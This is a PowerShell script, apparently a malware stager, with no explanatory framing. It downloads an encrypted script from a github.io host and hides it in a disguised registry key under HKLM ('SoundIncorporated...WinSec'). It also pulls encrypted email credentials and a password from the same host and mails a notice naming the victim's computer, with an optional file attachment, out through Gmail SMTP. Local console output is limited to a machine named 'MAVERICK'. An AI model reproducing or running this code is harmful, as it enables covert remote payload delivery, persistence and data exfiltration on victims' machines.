
[CmdletBinding(SupportsShouldProcess)]
param()
$fname=(new-guid).Guid
$fname = $fname.substring(0,20)
$FullLogs = ""
$LogFilePath="$env:Temp\$fname.001"

$RegKeyRootPath="HKLM:\SOFTWARE\SoundIncorporated"
$RegKeyPath=Join-Path $RegKeyRootPath "Software\Controls\MediaSystems"
$RegKeyName="WinSec"
$FullRegKeyPath=Join-Path $RegKeyPath $RegKeyName



Function OutString
{
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Msg,
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [ValidateSet('Information','Warning','Error')]
        [string]$Severity = 'Information'
    )

    if($env:COMPUTERNAME -like 'MAVERICK') {
        write-host '[install]   ' -NoNewLine -f Red
        write-host $Msg -f DarkYellow
    }
    Write-Verbose $Msg
    
    [pscustomobject]@{
        Time = (Get-Date -f g)
        Message = $Msg
        Severity = $Severity
    } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
    $FullLogs = $FullLogs + $Msg + '`n`n'
}


function Save-ScriptData {
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$ScriptData
    )

    if(Test-Path -Path $RegKeyRootPath){
        OutString "Remove-Item -Path $RegKeyRootPath"
        Remove-Item -Path $RegKeyRootPath -Recurse -Force 
    }

    OutString "New-Item –Path $RegKeyPath –Name $RegKeyName -Force"
    New-Item –Path $RegKeyPath –Name $RegKeyName -Force
    New-Itemproperty -path $FullRegKeyPath -Name $RegKeyName -value $ScriptData -Force
    Sleep 1
}


Function Send-UpdateNotification
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$subject,
        [string]$msgbody,
        [string]$file=""
    )
    try {
        $SecMFile='https://vr972be716a04eb6.github.io/dat/mail.dat'
        $SecPFile='https://vr972be716a04eb6.github.io/dat/ps.dat'
        $webclient = New-Object Net.WebClient
        $CmdData = $webclient.DownloadString($SecMFile)

        $Pass = $webclient.DownloadString($SecPFile)
        $Pass = $Pass.substring(0,30)
        $Pass.length
        $decrypted=Decrypt-String $CmdData $Pass
        $CharArray =$decrypted.Split(";")

        $EmailFrom = $CharArray[0]
        $EmailTo = $CharArray[1]
        $pass = $CharArray[2]

        $message = new-object System.Net.Mail.MailMessage 
        $message.From = $EmailFrom 
        $message.To.Add($EmailTo)
        $message.IsBodyHtml = $True 
        $message.Subject = $subject 

        if($file -ne ""){
          if(Test-Path -Path $file){
              $attachment = $file
              $attach = new-object Net.Mail.Attachment($attachment) 
              $message.Attachments.Add($attach)   
          }
        }
        $message.body = $msgbody
        $SMTPServer = "smtp.gmail.com"
        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
        $SMTPClient.EnableSsl = $true
        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass);
        $SMTPClient.Send($message)
    }
    catch
    {
        $Msg="Ran into an issue: $($PSItem.ToString())"
        #write-host '[test-exceptions] ' -NoNewLine -f Red
        #write-host $Msg -f DarkYellow
        write-verbose $Msg 
        if($PSCmdlet -ne $null){
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
        
    }   
}


$ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/rpt.dat.aes'
OutString "Updating the repeated code from $ScriptUrl"
     
$webclient = New-Object Net.WebClient
$EncryptedScript = $webclient.DownloadString($ScriptUrl)
Save-ScriptData $EncryptedScript
Sleep 2
Send-UpdateNotification "Update on $env:COMPUTERNAME" "Updating the repeated code from $ScriptUrl"